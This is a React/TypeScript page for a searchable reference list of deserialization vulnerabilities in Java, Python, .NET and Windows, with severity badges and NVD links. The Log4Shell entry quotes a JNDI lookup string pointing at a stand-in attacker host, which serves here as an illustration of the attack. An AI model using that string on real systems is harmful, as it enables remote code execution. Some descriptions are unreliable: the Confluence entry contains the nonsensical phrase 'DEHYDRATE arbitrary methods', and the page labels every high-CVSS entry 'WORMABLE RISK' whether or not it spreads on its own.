'use client';

import React, { useState } from 'react';
import { ExternalLink, Shield, AlertTriangle } from 'lucide-react';
import { Badge } from '@/components/ui/Badge';

type Severity = 'CRITICAL' | 'HIGH' | 'MEDIUM';

interface CVEEntry {
  id: string;
  title: string;
  cvss: number | null;
  runtime: string;
  format: string;
  severity: Severity;
  description: string;
  year: number | null;
  cwe: string;
}

const CVE_DATA: CVEEntry[] = [
  {
    id: 'CVE-2015-4852',
    title: 'Java Commons Collections Remote Code Execution',
    cvss: 9.8,
    runtime: 'Java',
    format: 'Java Serialization',
    severity: 'CRITICAL',
    year: 2015,
    cwe: 'CWE-502',
    description:
      'Apache Commons Collections gadget chain allows unauthenticated remote code execution via Java serialization. Exploited by crafting an InvokerTransformer chain that bypasses serialization filters. Affected WebLogic, WebSphere, JBoss, Jenkins. Disclosed by FoxGlove Security.',
  },
  {
    id: 'CVE-2016-4437',
    title: 'Apache Shiro RememberMe Deserialization RCE',
    cvss: 9.8,
    runtime: 'Java',
    format: 'Java Serialization + AES',
    severity: 'CRITICAL',
    year: 2016,
    cwe: 'CWE-502',
    description:
      'Apache Shiro\'s RememberMe cookie is deserialized after AES-CBC decryption using a hardcoded default key. Attackers who know the key (or guess it from public repos) can craft a malicious serialized payload and achieve RCE on any Shiro-protected application.',
  },
  {
    id: 'CVE-2017-9805',
    title: 'Apache Struts 2 REST Plugin XStream RCE',
    cvss: 9.8,
    runtime: 'Java',
    format: 'XStream XML/JSON',
    severity: 'CRITICAL',
    year: 2017,
    cwe: 'CWE-20',
    description:
      'The Struts 2 REST Plugin uses XStream to deserialize XML and JSON request bodies. A crafted XML payload with a DynamicProxyHandler can execute arbitrary Java code without authentication. Affected versions prior to 2.5.13.',
  },
  {
    id: 'CVE-2019-0708',
    title: 'BlueKeep — Windows RDP Pre-Auth RCE',
    cvss: 9.8,
    runtime: 'Windows / C',
    format: 'RDP protocol deserialization',
    severity: 'CRITICAL',
    year: 2019,
    cwe: 'CWE-416',
    description:
      'A use-after-free vulnerability in the Windows RDP service allows unauthenticated attackers to execute arbitrary code by sending specially crafted RDP messages. The protocol deserialization mishandles Channel_Call data structures. Wormable — no user interaction required.',
  },
  {
    id: 'CVE-2020-2555',
    title: 'Oracle Coherence Gadget Chain RCE',
    cvss: 9.8,
    runtime: 'Java',
    format: 'Java Serialization (T3)',
    severity: 'CRITICAL',
    year: 2020,
    cwe: 'CWE-502',
    description:
      'Oracle Coherence exposes a T3 protocol endpoint that accepts Java serialized objects. A gadget chain through com.tangosol.util.filter.LimitFilter and ReflectionExtractor enables unauthenticated RCE. Affects Oracle WebLogic Server bundled with Coherence.',
  },
  {
    id: 'CVE-2021-44228',
    title: 'Log4Shell — Log4j JNDI Deserialization RCE',
    cvss: 10.0,
    runtime: 'Java',
    format: 'JNDI / LDAP deserialization',
    severity: 'CRITICAL',
    year: 2021,
    cwe: 'CWE-502',
    description:
      'Log4j\'s message lookup feature resolves JNDI strings in log messages. An attacker logs a string like ${jndi:ldap://attacker/a} to trigger LDAP lookup and Java object deserialization. The returned object executes code in the JVM. Affected millions of systems globally — CVSS 10.0.',
  },
  {
    id: 'CVE-2022-22965',
    title: 'Spring4Shell — Spring Framework DataBinder RCE',
    cvss: 9.8,
    runtime: 'Java',
    format: 'Spring MVC data binding',
    severity: 'CRITICAL',
    year: 2022,
    cwe: 'CWE-94',
    description:
      'Spring Framework\'s DataBinder allows class property binding via HTTP parameters. On JDK 9+ with Tomcat, an attacker can bind class.module.classLoader to load a malicious class via Tomcat\'s log accessor, leading to arbitrary JSP write and code execution.',
  },
  {
    id: 'CVE-2023-22527',
    title: 'Confluence Server OGNL Injection RCE',
    cvss: 10.0,
    runtime: 'Java',
    format: 'OGNL expression deserialization',
    severity: 'CRITICAL',
    year: 2023,
    cwe: 'CWE-74',
    description:
      'A template injection vulnerability in Confluence Server allows unauthenticated attackers to inject OGNL expressions via HTTP request parameters. OGNL evaluation performs object graph navigation which can DEHYDRATE arbitrary methods — equivalent to deserialization gadget chains in impact. CVSS 10.0.',
  },
  {
    id: 'PICKLE-RCE-001',
    title: 'Python Pickle Arbitrary Code Execution (No CVE)',
    cvss: null,
    runtime: 'Python',
    format: 'Pickle (pickle, _pickle, pickletools)',
    severity: 'CRITICAL',
    year: null,
    cwe: 'CWE-502',
    description:
      'Python\'s pickle module is documented as inherently unsafe for untrusted input. The __reduce__ protocol hook allows arbitrary callables to execute on deserialization. Affects any application passing user-controlled bytes to pickle.loads() — including ML inference endpoints that accept model files.',
  },
  {
    id: 'DOTNET-VIEWSTATE-001',
    title: '.NET ViewState Without MAC Deserialization RCE (No CVE)',
    cvss: null,
    runtime: '.NET',
    format: 'BinaryFormatter ViewState',
    severity: 'HIGH',
    year: null,
    cwe: 'CWE-565',
    description:
      'ASP.NET ViewState without Message Authentication Code validation (EnableViewStateMac=false or known machineKey) is vulnerable to arbitrary BinaryFormatter deserialization. Attackers submit crafted ViewState strings that exploit gadget chains through ObjectStateFormatter to achieve RCE on the web server process.',
  },
];

const SEVERITY_ORDER: Record<Severity, number> = { CRITICAL: 0, HIGH: 1, MEDIUM: 2 };

const RUNTIME_FILTERS = ['All', 'Java', 'Python', '.NET', 'Windows'];

export default function CVEDatabasePage() {
  const [search, setSearch] = useState('');
  const [runtimeFilter, setRuntimeFilter] = useState('All');

  const filtered = CVE_DATA.filter(c => {
    const matchesSearch =
      !search ||
      c.id.toLowerCase().includes(search.toLowerCase()) ||
      c.title.toLowerCase().includes(search.toLowerCase()) ||
      c.description.toLowerCase().includes(search.toLowerCase());
    const matchesRuntime =
      runtimeFilter === 'All' || c.runtime.toLowerCase().includes(runtimeFilter.toLowerCase());
    return matchesSearch && matchesRuntime;
  }).sort((a, b) => SEVERITY_ORDER[a.severity] - SEVERITY_ORDER[b.severity]);

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-xl font-bold text-serial-text">CVE Database</h1>
          <p className="text-xs font-mono text-serial-text-muted mt-1">
            Deserialization vulnerability reference · {CVE_DATA.length} entries
          </p>
        </div>
        <div className="flex items-center gap-2 px-3 py-1.5 rounded-lg bg-serial-surface border border-serial-border">
          <Shield size={12} className="text-serial-emerald" />
          <span className="text-xs font-mono text-serial-emerald">REFERENCE ONLY</span>
        </div>
      </div>

      {/* Filters */}
      <div className="flex items-center gap-3">
        <input
          type="text"
          placeholder="Search CVEs..."
          value={search}
          onChange={e => setSearch(e.target.value)}
          className="flex-1 bg-serial-surface border border-serial-border rounded-xl px-4 py-2 text-xs font-mono text-serial-text placeholder:text-serial-text-muted focus:outline-none focus:border-serial-violet/50 transition-colors"
        />
        <div className="flex items-center gap-1">
          {RUNTIME_FILTERS.map(r => (
            <button
              key={r}
              onClick={() => setRuntimeFilter(r)}
              className={`px-3 py-2 rounded-lg text-xs font-mono transition-all hover:scale-[1.02] active:scale-[0.98] ${
                runtimeFilter === r
                  ? 'bg-serial-violet/15 text-serial-violet border border-serial-violet/25'
                  : 'text-serial-text-muted border border-transparent hover:bg-serial-surface2 hover:text-serial-text-secondary'
              }`}
            >
              {r}
            </button>
          ))}
        </div>
      </div>

      {/* CVE grid */}
      <div className="grid grid-cols-1 gap-4">
        {filtered.map(cve => (
          <CVECard key={cve.id} cve={cve} />
        ))}
        {filtered.length === 0 && (
          <div className="text-center py-16 text-serial-text-muted font-mono text-xs">
            No CVEs match the current filter.
          </div>
        )}
      </div>
    </div>
  );
}

function CVECard({ cve }: { cve: CVEEntry }) {
  const sevVariantMap: Record<Severity, 'critical' | 'high' | 'medium'> = {
    CRITICAL: 'critical',
    HIGH: 'high',
    MEDIUM: 'medium',
  };

  return (
    <div className="bg-serial-surface border border-serial-border rounded-2xl p-5 hover:border-serial-violet/40 transition-colors duration-200 shadow-lg shadow-black/20">
      <div className="flex items-start justify-between gap-4">
        <div className="flex-1 min-w-0">
          {/* Top row */}
          <div className="flex items-center flex-wrap gap-2 mb-2">
            <span className="font-mono text-xs font-bold text-serial-violet">{cve.id}</span>
            {cve.year && (
              <span className="text-xs font-mono text-serial-text-muted">({cve.year})</span>
            )}
            <Badge variant={sevVariantMap[cve.severity]}>{cve.severity}</Badge>
            {cve.cvss !== null ? (
              <span
                className={`text-xs font-mono px-2 py-0.5 rounded border ${
                  cve.cvss >= 9.0
                    ? 'text-serial-crimson border-serial-crimson/30 bg-serial-crimson/10'
                    : cve.cvss >= 7.0
                    ? 'text-orange-400 border-orange-500/30 bg-orange-500/10'
                    : 'text-serial-amber border-serial-amber/30 bg-serial-amber/10'
                }`}
              >
                CVSS {cve.cvss.toFixed(1)}
              </span>
            ) : (
              <span className="text-xs font-mono text-serial-text-muted border border-serial-border px-2 py-0.5 rounded">
                No CVSS
              </span>
            )}
          </div>

          <h3 className="text-sm font-semibold text-serial-text mb-2">{cve.title}</h3>
          <p className="text-xs text-serial-text-muted leading-relaxed mb-3">{cve.description}</p>

          {/* Tags */}
          <div className="flex flex-wrap gap-2">
            <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-serial-surface2 border border-serial-border text-serial-text-secondary">
              {cve.runtime}
            </span>
            <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-serial-surface2 border border-serial-border text-serial-text-secondary">
              {cve.format}
            </span>
            <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-serial-violet/5 border border-serial-violet/20 text-serial-violet">
              {cve.cwe}
            </span>
          </div>
        </div>

        {/* Right side */}
        <div className="shrink-0 flex flex-col items-end gap-2">
          {cve.cvss !== null && cve.cvss >= 9.0 && (
            <div className="flex items-center gap-1">
              <AlertTriangle size={12} className="text-serial-crimson" />
              <span className="text-[10px] font-mono text-serial-crimson">WORMABLE RISK</span>
            </div>
          )}
          {cve.id.startsWith('CVE-') && (
            <a
              href={`https://nvd.nist.gov/vuln/detail/${cve.id}`}
              target="_blank"
              rel="noopener noreferrer"
              className="flex items-center gap-1.5 text-[10px] font-mono text-serial-text-muted hover:text-serial-violet transition-colors"
            >
              NVD <ExternalLink size={10} />
            </a>
          )}
        </div>
      </div>
    </div>
  );
}
